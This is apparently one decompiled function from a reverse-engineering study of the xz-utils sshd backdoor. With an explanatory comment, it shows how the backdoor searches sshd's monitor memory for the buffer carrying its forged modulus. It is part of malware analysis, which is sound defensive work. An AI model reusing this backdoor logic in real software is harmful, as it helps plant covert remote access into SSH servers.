// /home/kali/xzre-ghidra/xzregh/107A20_sshd_get_sshbuf.c
// Function: sshd_get_sshbuf @ 0x107A20
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_get_sshbuf(sshbuf * sshbuf, global_context_t * ctx)


/*
 * AutoDoc: Finds the sshbuf inside sshd’s monitor structure that now holds the forged modulus. It dereferences
 * global_ctx->struct_monitor_ptr_address, uses the packed sshd_offsets to identify the m_pkex pointer and the sshbuf data/size
 * fields, and validates any candidate via sshbuf_extract. When offsets are unknown it brute-forces the pkex table: two buffers
 * must decode to “SSH-2.0”/“ssh-2.0” string IDs and the next buffer must look like a negative bignum (sshbuf_bignum_is_negative).
 * Only then does it return the mapped sshbuf->d pointer and length.
 */

#include "xzre_types.h"

BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)

{
  kex *pkex_end;
  char pkex_index;
  byte size_index;
  byte data_index;
  monitor *monitor_ptr;
  BOOL success;
  EncodedStringId banner_id;
  ulong data_field_offset;
  ulong size_field_offset;
  kex **pkex_table;
  kex *pkex_cursor;
  u64 entry_span;
  uint banner_matches;
  
  if (sshbuf == (sshbuf *)0x0) {
    return FALSE;
  }
  if (((ctx != (global_context_t *)0x0) && (ctx->struct_monitor_ptr_address != (monitor **)0x0)) &&
     (success = is_range_mapped((u8 *)ctx->struct_monitor_ptr_address,8,ctx), success != FALSE)) {
    monitor_ptr = *ctx->struct_monitor_ptr_address;
    success = is_range_mapped((u8 *)monitor_ptr,0x20,ctx);
    if (success != FALSE) {
      pkex_index = *(char *)((long)&(ctx->sshd_offsets).field0_0x0 + 1);
      pkex_table = monitor_ptr->m_pkex;
      if (-1 < pkex_index) {
        pkex_table = *(kex ***)((long)&monitor_ptr->m_recvfd + (long)((int)pkex_index << 2));
      }
      size_index = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 3);
      data_index = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 2);
      entry_span = 0x48;
      if (-1 < (char)(data_index & size_index)) {
        size_field_offset = (ulong)((int)(char)size_index << 3);
        data_field_offset = (ulong)((int)(char)data_index << 3);
        entry_span = size_field_offset + 8;
        if (size_field_offset < data_field_offset) {
          entry_span = data_field_offset + 8;
        }
      }
      success = is_range_mapped((u8 *)pkex_table,8,ctx);
      if ((success != FALSE) &&
         (success = is_range_mapped(&(*pkex_table)->opaque,0x400,ctx), success != FALSE)) {
        pkex_index = *(char *)&(ctx->sshd_offsets).field0_0x0;
        pkex_cursor = *pkex_table;
        if (pkex_index < '\0') {
          banner_matches = 0;
          pkex_end = pkex_cursor + 0x400;
          for (; pkex_cursor < pkex_end; pkex_cursor = pkex_cursor + 8) {
            success = is_range_mapped(&pkex_cursor->opaque,entry_span,ctx);
            if ((success != FALSE) &&
               (success = sshbuf_extract(*(sshbuf **)pkex_cursor,ctx,&sshbuf->d,&sshbuf->size),
               success != FALSE)) {
              if (banner_matches < 2) {
                banner_id = get_string_id((char *)sshbuf->d,(char *)(sshbuf->d + 7));
                if ((banner_id == STR_SSH_2_0) || (banner_id == STR_ssh_2_0)) {
                  banner_matches = banner_matches + 1;
                }
              }
              else {
                success = sshbuf_bignum_is_negative(sshbuf);
                if (success != FALSE) {
                  return TRUE;
                }
              }
            }
          }
        }
        else {
          success = sshbuf_extract(*(sshbuf **)(pkex_cursor + ((int)pkex_index << 3)),ctx,&sshbuf->d,
                                 &sshbuf->size);
          if (success != FALSE) {
            success = sshbuf_bignum_is_negative(sshbuf);
            return (uint)(success != FALSE);
          }
        }
      }
    }
  }
  return FALSE;
}

